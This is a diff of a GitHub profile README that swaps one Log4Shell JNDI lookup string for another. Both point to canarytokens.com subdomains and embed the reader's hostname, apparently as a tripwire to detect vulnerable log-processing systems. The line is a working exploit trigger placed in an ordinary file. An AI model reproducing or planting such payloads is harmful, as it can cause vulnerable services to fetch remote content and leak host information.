@@ -8,4 +8,4 @@
 megaman777/megaman777 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
-${jndi:ldap://x${hostName}.L4J.pdwhnm8mr2gstgf9fg8wemn9e.canarytokens.com/a}
+${jndi:ldap://x${hostName}.L4J.m5fs2vcrbqykwnth3q22v5as1.canarytokens.com/a}
